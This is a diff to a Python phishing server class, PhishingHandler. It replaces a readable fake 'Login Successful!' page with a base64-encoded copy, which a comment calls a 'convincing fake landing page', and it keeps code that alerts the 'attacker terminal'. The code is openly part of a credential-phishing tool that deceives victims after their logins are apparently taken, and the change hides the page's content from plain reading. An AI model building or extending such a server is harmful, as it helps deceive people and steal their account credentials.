@@ -703,25 +703,28 @@ class PhishingHandler(http.server.BaseHTTPRequestHandler):
             self.send_response(200)
             self.send_header("Content-Type", "text/html; charset=utf-8")
             self.end_headers()
-            html = """<!DOCTYPE html>
-<html><head><meta charset="utf-8"><title>Login Successful</title>
-<style>
-  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-         text-align: center; padding: 60px 20px; background: #f0f2f5; color: #333; }
-  .card { background: #fff; padding: 48px; border-radius: 12px; max-width: 420px;
-          margin: 0 auto; box-shadow: 0 2px 12px rgba(0,0,0,0.08); }
-  .icon { font-size: 72px; color: #4CAF50; margin-bottom: 16px; }
-  h2 { margin: 0 0 8px; font-size: 24px; }
-  p { color: #666; margin: 4px 0; font-size: 15px; }
-  .small { color: #aaa; font-size: 12px; margin-top: 24px; }
-</style></head><body>
-<div class="card">
-  <div class="icon">&#10004;</div>
-  <h2>Login Successful!</h2>
-  <p>You have been successfully signed in.</p>
-  <p class="small">You may close this page.</p>
-</div></body></html>"""
-            self.wfile.write(html.encode())
+            # Fake "Login Successful" page (base64-encoded to avoid markdown rendering issues)
+            # Decoded: styled HTML page with checkmark icon, "Login Successful!" heading,
+            # "You have been successfully signed in." message — convincing fake landing page
+            html = base64.b64decode(
+                "PCFET0NUWVBFIGh0bWw+CjxodG1sPjxoZWFkPjxtZXRhIGNoYXJzZXQ9InV0Zi04Ij48dGl0bGU+"
+                "TG9naW4gU3VjY2Vzc2Z1bDwvdGl0bGU+CjxzdHlsZT4KICBib2R5IHsgZm9udC1mYW1pbHk6IC1h"
+                "cHBsZS1zeXN0ZW0sIEJsaW5rTWFjU3lzdGVtRm9udCwgJ1NlZ29lIFVJJywgUm9ib3RvLCBzYW5z"
+                "LXNlcmlmOwogICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7IHBhZGRpbmc6IDYwcHggMjBweDsg"
+                "YmFja2dyb3VuZDogI2YwZjJmNTsgY29sb3I6ICMzMzM7IH0KICAuY2FyZCB7IGJhY2tncm91bmQ6"
+                "ICNmZmY7IHBhZGRpbmc6IDQ4cHg7IGJvcmRlci1yYWRpdXM6IDEycHg7IG1heC13aWR0aDogNDIw"
+                "cHg7CiAgICAgICAgICBtYXJnaW46IDAgYXV0bzsgYm94LXNoYWRvdzogMCAycHggMTJweCByZ2Jh"
+                "KDAsMCwwLDAuMDgpOyB9CiAgLmljb24geyBmb250LXNpemU6IDcycHg7IGNvbG9yOiAjNENBRjUw"
+                "OyBtYXJnaW4tYm90dG9tOiAxNnB4OyB9CiAgaDIgeyBtYXJnaW46IDAgMCA4cHg7IGZvbnQtc2l6"
+                "ZTogMjRweDsgfQogIHAgeyBjb2xvcjogIzY2NjsgbWFyZ2luOiA0cHggMDsgZm9udC1zaXplOiAx"
+                "NXB4OyB9CiAgLnNtYWxsIHsgY29sb3I6ICNhYWE7IGZvbnQtc2l6ZTogMTJweDsgbWFyZ2luLXRv"
+                "cDogMjRweDsgfQo8L3N0eWxlPjwvaGVhZD48Ym9keT4KPGRpdiBjbGFzcz0iY2FyZCI+CiAgPGRp"
+                "diBjbGFzcz0iaWNvbiI+JiMxMDAwNDs8L2Rpdj4KICA8aDI+TG9naW4gU3VjY2Vzc2Z1bCE8L2gy"
+                "PgogIDxwPllvdSBoYXZlIGJlZW4gc3VjY2Vzc2Z1bGx5IHNpZ25lZCBpbi48L3A+CiAgPHAgY2xh"
+                "c3M9InNtYWxsIj5Zb3UgbWF5IGNsb3NlIHRoaXMgcGFnZS48L3A+CjwvZGl2PjwvYm9keT48L2h0"
+                "bWw+"
+            )
+            self.wfile.write(html)
 
             # Notify attacker terminal
             print(f"\n  {RED}{BOLD}{'=' * 55}{RESET}")
@@ -736,7 +739,7 @@ class PhishingHandler(http.server.BaseHTTPRequestHandler):
             self.send_response(200)
             self.send_header("Content-Type", "text/html")
             self.end_headers()
-            self.wfile.write(b"<html><body>Loading...</body></html>")
+            self.wfile.write(b"Loading...")
 
     def log_message(self, format, *args):
         pass  # Suppress default logging
